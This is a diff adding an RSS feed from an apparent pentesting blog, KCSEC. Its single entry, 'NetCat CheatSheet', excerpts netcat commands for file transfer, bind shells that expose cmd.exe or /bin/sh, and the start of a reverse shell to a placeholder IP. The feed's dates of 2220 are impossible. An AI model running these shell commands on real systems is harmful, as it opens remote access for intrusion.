@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cheatsheet on KCSEC</title>
+    <link>https://www.ivoidwarranties.tech/categories/cheatsheet/</link>
+    <description>Recent content in Cheatsheet on KCSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>KCSEC</copyright>
+    <lastBuildDate>Mon, 04 Sep 2220 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://www.ivoidwarranties.tech/categories/cheatsheet/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>NetCat CheatSheet</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/netcat/cheatsheet/</link>
+      <pubDate>Mon, 04 Sep 2220 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/netcat/cheatsheet/</guid>
+      <description>Transferring a File nc -lvp 4444 &amp;gt; output.txt #Receive nc -nv &amp;lt;IP Address&amp;gt; &amp;lt; input.txt #Send  Netcat Bind Shell (Windows) nc -lvp 4444 -e cmd.exe nc -nv &amp;lt;IP Address&amp;gt; 4444 #Connect to the shell  Netcat Bind Shell (Linux) nc -lvp 4444 -e /bin/sh nc -nv &amp;lt;IP Address&amp;gt; 4444 #Connect to the shell  Netcat Reverse Shell (Windows) nc -lvp 443 # Listening for connection nc -nv &amp;lt;IP Address&amp;gt; 443 -e cmd.</description>
+    </item>
+    
+  </channel>
+</rss>
